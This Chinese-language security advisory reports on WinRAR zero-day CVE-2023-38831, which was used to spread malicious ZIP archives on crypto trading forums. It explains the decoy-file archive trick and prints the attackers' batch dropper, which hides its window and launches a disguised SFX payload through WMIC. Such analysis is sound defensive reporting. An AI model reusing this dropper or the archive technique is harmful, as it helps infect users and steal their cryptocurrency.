#  WinRAR再爆0 day漏洞   
 关键基础设施安全应急响应中心   2023-08-29 15:20  
  
WinRAR再爆0 day漏洞，已被利用超过4个月。   
  
Winrar是一款免费的主流压缩文件解压软件，支持绝大部分压缩文件格式的解压，全球用户量超过5亿。Group-IB研究人员在分析DarkMe恶意软件时发现WinRAR在处理ZIP文件格式时的一个漏洞，漏洞CVE编号为CVE-2023-38831。攻击者利用该漏洞可以创建欺骗性扩展的诱饵文件来隐藏恶意脚本，即将恶意脚本隐藏在伪装为.jpg、.txt和其他文件格式的压缩文件中，并窃取用户加密货币账户。  
  
研究人员在分析DarkMe恶意软件时发现了一些可疑的ZIP文件。Group-IB在8个加密货币交易的主流论坛上发现了这些恶意ZIP文件，如图1所示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29aEz2Xciah2QnmjqweDJB8Fs38D0TnapHya8icQU0gDjPa80OXPT98vMlFo6cJPyOJ1mPMInMCdabw/640?wx_fmt=png&wxfrom=13 "")  
  
图1. 交易论坛发布的帖子  
  
CVE-2023-38831漏洞序列图如图2所示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29aEz2Xciah2QnmjqweDJB8FLKibHE7GdnGwtjhReuKYCjuLPibJqy6egBe8ibUZ1kr6K0OSuJE8qwx5A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
图2. CVE-2023-38831漏洞序列图  
  
所有压缩文件都是用同一方法创建的，结构相同，包括一个诱饵文件和一个包含恶意文件和未使用文件的文件夹。当用户打开恶意压缩文件后，受害者机会看到一个图像文件和一个相同文件名的文件夹，如图3所示。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29aEz2Xciah2QnmjqweDJB8FU4TnjnAH6vliaY4AILmvs9Cl1X7GYj39x3UtzUShR9WM5zMVYNfJ8DA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
图3. 恶意zip文件示例  
  
如果受害者打开伪装为图像的诱饵文件，恶意脚本就会执行攻击的下一阶段，如图4所示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29aEz2Xciah2QnmjqweDJB8F9z7qdvBibWxevURMrZwoJP7uoThqWJ9Ju9viaLyV2SRp1HJGrsW6JSDg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
图4. 攻击流程图  
  
脚本的主要作用是进入攻击的下一阶段，这是通过运行最小化窗口来完成的。然后搜索两个特定文件“Screenshot_05-04-2023.jpg”和 “Images.ico”。JPG文件是受害者打开的图像，“Images.ico”是用来提取和启动新文件的SFX CAB压缩文件。恶意脚本示例如下：  
  
@echo off  
  
if not DEFINED IS_MINIMIZED  
  
  set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit  
  
  cd %TEMP%  
  
  for /F "delims=" %%K in ('dir /b /s "Screenshot_05-04-2023.jpg"') do  
  
    for /F "delims=" %%G in ('dir /b /s "Images.ico"') do  
  
      WMIC process call create "%%~G" && "%%~K" && cd %CD% && exit  
  
Exit  
  
为了解漏洞工作原理，研究人员创建了2个与发现的恶意压缩文件结构相同的压缩文件。两个文件都包含图像文件，其中一个压缩文件中还包含一个存储脚本的内部文件夹，可以触发消息展示框。然后，研究人员修改了其中一个文件使其与恶意压缩文件一样。然后，比较WinRAR在解压不同压缩文件时的区别。  
  
研究人员主要想确定在打开解压文件时会在%TEMP%/%RARTMPDIR%文件夹中创建什么文件。在原始的zip文件中，只会创建image.jpg文件。在恶意文件zip文件中，其中的文件夹内容也会被提取。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29aEz2Xciah2QnmjqweDJB8FRXFicfmvJNHBRzRdrYO8icaV8RG40jMJ53aAql8b0vaDw7nBQEv2cAFA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
图5. 不同zip文件解压比较  
  
也就是说，攻击发生在WinRAR尝试打开用户想要访问的文件时。ShellExecute函数接收到了打开文件的错误参数。图像文件名与搜索不匹配，引发其被跳过。然后就发现了批处理文件，并执行。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29aEz2Xciah2QnmjqweDJB8FfQN26iaQLeysfRt9BDSibdas94IayAATOD27nIjEDeHHJp4gSUnHE6XA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
图6 漏洞复现  
  
8月15日该漏洞被分配了CVE编号，但该漏洞从2023年4月开始就被在野利用。研究人员建议WinRAR用户更新到最新的v 6.23版本。  
  
**参考及来源：**  
  
https://www.group-ib.com/blog/cve-2023-38831-winrar-zero-day/  
  
  
  
原文来源：嘶吼专业版  
  
“投稿联系方式：孙中豪 010-82992251   sunzhonghao@cert.org.cn”  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/iaz5iaQYxGogvC8qicuLNlkT5ibJnwu1leQiabRVqFk4Sb3q1fqrDhicLBNAqVY4REuTetY1zBYuUdic0nVhZR4FHpAfg/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
